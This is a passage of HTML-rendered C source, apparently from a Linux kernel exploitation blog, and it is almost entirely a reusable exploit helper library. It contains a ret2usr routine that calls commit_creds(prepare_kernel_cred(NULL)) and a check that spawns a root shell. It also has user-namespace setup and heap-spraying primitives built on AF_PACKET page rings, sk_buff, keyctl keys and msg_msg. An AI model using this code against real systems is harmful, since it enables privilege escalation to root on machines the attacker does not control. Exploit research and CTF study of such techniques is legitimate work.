class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pushf;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_core</span><span class="params">(<span class="keyword">int</span> core)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for ret2usr attacker */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_privilige</span><span class="params">(<span class="keyword">size_t</span> prepare_kernel_cred, <span class="keyword">size_t</span> commit_creds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*prepare_kernel_cred_ptr)(<span class="keyword">void</span> *) = </span><br><span class="line">                                         (<span class="keyword">void</span> *(*)(<span class="keyword">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*commit_creds_ptr)(<span class="keyword">void</span> *) = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>*)) commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - fundamental  kernel structures</span></span><br><span class="line"><span class="comment"> * e.g. list_head</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">packet_socket_setup</span><span class="params">(<span class="keyword">uint32_t</span> block_size, <span class="keyword">uint32_t</span> frame_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uint32_t</span> block_nr, <span class="keyword">uint32_t</span> sizeof_priv, <span class="keyword">int</span> timeout)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="keyword">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	req3.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req3.tp_block_nr = block_nr;</span><br><span class="line">	req3.tp_block_size = block_size;</span><br><span class="line">	req3.tp_frame_size = frame_size;</span><br><span class="line">	req3.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req3.tp_retire_blk_tov = timeout;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = bind(s, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind (AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_cmd_handler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_pgv_system</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - keyctl related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `keyctl.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_SPEC_PROCESS_KEYRING	-2	<span class="comment">/* - key ID for process-specific keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UPDATE			2	<span class="comment">/* update a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_REVOKE			3	<span class="comment">/* revoke a key */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_UNLINK			9	<span class="comment">/* unlink a key from a keyring */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYCTL_READ			11	<span class="comment">/* read a key or keyring&#x27;s contents */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_alloc</span><span class="params">(<span class="keyword">char</span> *description, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen, </span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_update</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_read</span><span class="params">(<span class="keyword">int</span> keyid, <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_revoke</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_unlink</span><span class="params">(<span class="keyword">int</span> keyid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * V - sk_buff spraying related</span></span><br><span class="line"><span class="comment"> * note that the sk_buff&#x27;s tail is with a 320-bytes skb_shared_info</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * socket&#x27;s definition should be like:</span></span><br><span class="line"><span class="comment"> * int sk_sockets[SOCKET_NUM][2];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_socket_array</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* socket pairs to spray sk_buff */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_socket[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_sk_buff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[x] failed to received sk_buff!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - msg_msg related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_msg_queue</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((struct msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> 